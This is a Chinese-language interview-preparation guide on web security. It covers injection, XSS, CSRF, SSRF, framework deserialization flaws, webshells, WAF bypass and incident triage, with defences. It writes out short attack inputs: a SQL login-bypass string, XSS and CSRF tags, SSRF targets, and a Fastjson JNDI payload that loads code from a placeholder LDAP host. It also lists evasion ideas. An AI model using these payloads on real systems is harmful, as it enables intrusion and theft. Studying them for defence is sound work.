安服面试

网络安全面试题全攻略（含详解与示例）

一、Web安全基础及注入类攻击

1. SQL注入原理与分类

原理：攻击者通过构造恶意SQL语句欺骗服务器执行未授权的操作，绕过身份认证或操作数据库。

示例：

-- 登录框中输入：
用户名：admin' --
密码：任意
-- 查询语句变为：
SELECT * FROM users WHERE username = 'admin' --' AND password = 'xxx';
-- 由于 -- 注释，password 条件失效，直接登录成功。

分类：

  • 联合查询注入（Union-Based）：使用 UNION SELECT 拼接恶意查询返回数据。
  • 错误回显注入（Error-Based）：利用数据库错误信息返回内容。
  • 布尔盲注（Boolean-Based Blind）：根据页面响应是否变化判断真假。
  • 时间盲注（Time-Based Blind）：构造 SLEEP() 等延时函数判断数据。
  • 堆叠注入（Stacked Queries）：多语句执行（如 MSSQL ;exec xp_cmdshell）

防护措施：

  • 使用预编译语句（PreparedStatement）或ORM框架
  • 严格过滤用户输入
  • 设置数据库最小权限
  • WAF拦截

2. XSS（跨站脚本攻击）

原理：注入恶意脚本，在用户浏览器中执行。

分类：

  • 存储型：恶意脚本存入数据库（如留言板）
  • 反射型：URL参数中携带脚本
  • DOM型：由前端JS处理并插入页面

示例：

<a href="http://example.com/?q=<script>alert(1)</script>">点击</a>

防护措施：

  • HTML/JS输出编码
  • 使用 CSP 内容安全策略
  • HttpOnly 设置 Cookie

3. CSRF 与 SSRF

CSRF（跨站请求伪造）

原理：攻击者伪造请求诱导用户点击，使浏览器在不知情的情况下执行操作。

示例：
用户登录银行后未注销，访问如下页面：

<img src="http://bank.com/transfer?to=hacker&amount=1000">

防护措施：

  • 每个请求带随机 Token（CSRF Token）
  • 验证 Referer 或 Origin
  • 设置 Cookie SameSite 属性

SSRF（服务器端请求伪造）

原理：攻击者构造请求让服务器访问指定资源，探测内网或获取敏感信息。

示例：
上传头像功能从外部拉取图片：

URL: http://127.0.0.1:8000/admin

利用协议：HTTP、HTTPS、FTP、FILE、Gopher、LDAP 等。

防护措施：

  • 白名单 URL
  • 拒绝访问 127.0.0.1、169.254.169.254 等本地地址
  • 禁止协议转换或重定向

二、常见框架与组件漏洞

4. Shiro RememberMe反序列化漏洞

原理：Shiro 框架使用 rememberMe cookie 存储序列化对象，若使用默认密钥则可被解密并反序列化执行攻击链。

利用流程：

  1. 构造 CommonsCollections Gadget 的恶意反序列化 payload。
  2. 使用默认密钥 AES 加密后 Base64 编码。
  3. 替换 Cookie 值发送到服务器。

示例工具：ysoserial、ShiroAttack2

防护措施：

  • 修改默认密钥
  • 禁用 rememberMe
  • 使用安全反序列化方案（如白名单类）

5. Weblogic 漏洞原理

典型漏洞：

  • CVE-2020-14882：控制台未授权访问
  • T3 协议反序列化漏洞：通过 T3 协议发送序列化数据，服务器直接反序列化执行命令
  • XMLDecoder 漏洞：反序列化 XML 数据触发命令

利用影响：

  • Getshell
  • 横向传播至内网其他服务
  • 安装内存马

6. Fastjson 漏洞

原理：开启 autoType 功能后可加载任意类导致命令执行。

示例：

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.x.x.x:1389/obj","autoCommit":true}

防护：

  • 禁用 autoType
  • 升级 Fastjson 版本
  • 添加黑名单类限制加载

7. 常见框架漏洞

  • Struts2 S2-045：OGNL表达式注入 → RCE
  • Spring4Shell：SpEL表达式注入 → RCE
  • Jackson：类型混淆 → 反序列化RCE

三、安全攻防相关题目

8. 文件上传漏洞利用思路

攻击点：

  • 上传压缩包中含有 ../../../webapps/shell.jsp → Zip Slip 漏洞
  • 上传 webshell 并通过解析漏洞触发执行
  • 伪装扩展名绕过（.jpg.php）
  • 嵌套压缩文件绕过内容检查

防护：

  • 校验文件类型和内容魔数
  • 上传路径不要可访问执行
  • 解压限制目录和层级

9. 态势感知平台排查恶意域名连接

步骤：

  1. 发现主机DNS解析恶意域名
  2. 查目标IP → 定位连接主机
  3. 用 netstat -ano 或 ss -pant 查找连接进程
  4. tasklist / ps 获取进程信息
  5. 进一步分析执行路径、父进程等

安全建设建议：

  • 建立终端日志审计系统
  • 流量监控与威胁情报联动
  • 统一平台化管理（如SOC、SIEM）
  • 自动封堵机制 + 应急响应流程

10. 内存马

原理：将恶意代码注入到JVM运行内存中，不落磁盘。

分类：

  • Servlet马
  • Filter马
  • Listener马
  • Agent型内存马

注入方式：

  • 使用反射修改 web 容器内部结构
  • 使用 Instrumentation 或 JVMTI 插入类

检测：

  • 内存快照分析（MAT工具）
  • 检查Web容器注册的动态类

四、反序列化与绕过技术

11. CommonsCollections Gadget 链

CC1~CC7链区别：

  • 利用不同类如 Transformer、AnnotationInvocationHandler 触发执行
  • 大多数依赖于 HashMap.readObject() 或 TemplatesImpl.getOutputProperties() 执行命令

示例流程：

  1. 使用 ysoserial 生成 payload
  2. 触发反序列化接口，如 Shiro、Weblogic T3

12. Fastjson 绕过原理

  • 拼接类名绕过 autoType 黑名单限制，如：
{"@type":"com.sun.rowset.JdbcRowSetImpl"}
  • 利用反射构造恶意对象链，如 JNDI注入

13. 免杀思路

  • 混淆关键命令（如base64、反射）
  • 加密payload（AES）后解密执行
  • 使用白利用类，如 cmd.exe 被包装到普通类调用中

14. WAF绕过技巧

  • URL编码：%27%20or%201=1--
  • 大小写混淆：UnIon SeLect
  • 请求头绕过：将Payload放入 X-Forwarded-For 中
  • 注释绕过：SE/**/LECT、UNION/**/ALL

五、网络安全面试常见问题

  1. 渗透测试流程包括？
  • 信息收集 → 漏洞扫描 → 漏洞验证 → 权限提升 → 持久化 → 横向移动 → 数据提取 → 报告编写
  1. 文件上传漏洞如何利用？
  • 伪装扩展名、绕过黑名单、上传压缩包目录穿越
  1. 常见提权方式？
  • Windows：计划任务、服务配置不当、提权漏洞（MS10-092）
  • Linux：SUID提权、脏牛漏洞、提权脚本（如linpeas）
  1. 如何溯源 WebShell？
  • 查找 Web 根目录下最近变更文件
  • 日志审计（access.log、web.log）
  • 系统审计日志（如Sysmon、auditd）
  1. DNSLog 原理？
  • 构造恶意请求到攻击者控制的域名，通过DNS解析记录请求来源 IP，判断是否命令执行成功

  2. 身份认证与权限管理不当
  3. 敏感信息泄露
  4. XML 外部实体（XXE）
  5. 安全配置错误
  6. 不安全的反序列化
  7. 访问控制失效
  8. 组件漏洞（Fastjson、Spring）
  9. 日志监控不足
  10. CSRF 与业务逻辑缺陷
